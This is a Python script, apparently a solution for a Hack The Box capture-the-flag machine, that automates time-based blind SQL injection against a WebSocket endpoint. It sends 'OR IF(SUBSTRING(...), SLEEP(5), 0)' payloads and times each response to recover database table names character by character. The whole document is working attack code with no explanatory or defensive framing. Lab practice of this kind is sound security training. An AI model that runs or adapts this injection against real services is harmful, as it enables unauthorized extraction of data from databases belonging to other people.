import json
import websocket
import time
import string

url = "ws://soc-player.soccer.htb:9091/"
charset = string.ascii_lowercase + string.digits + "_"
max_len = 20
max_tables = 10

for t in range(0, max_tables):
    table_name = ""
    print(f"\n=== Extracting Table {t+1} (LIMIT {t},1) ===")

    for i in range(1, max_len+1):
        for c in charset:
            payload = f"1 OR IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='soccer_db' LIMIT {t},1),{i},1)='{c}', SLEEP(5), 0)# "
            ws = websocket.create_connection(url)
            data = json.dumps({"id": payload})

            start = time.time()
            ws.send(data)
            result = ws.recv()
            elapsed = time.time() - start
            ws.close()

            print(f"[{i}] Trying '{c}'... {elapsed:.2f}s")

            if elapsed > 4.5:
                table_name += c
                print(f"--> Found character {i}: {c}")
                break
        else:
            print("End of Table name.")
            break

    if table_name:
        print(f"✅ Table {t+1} Name: {table_name}")
    else:
        print(f"❌ No table found at LIMIT {t}, stopping.")
        break
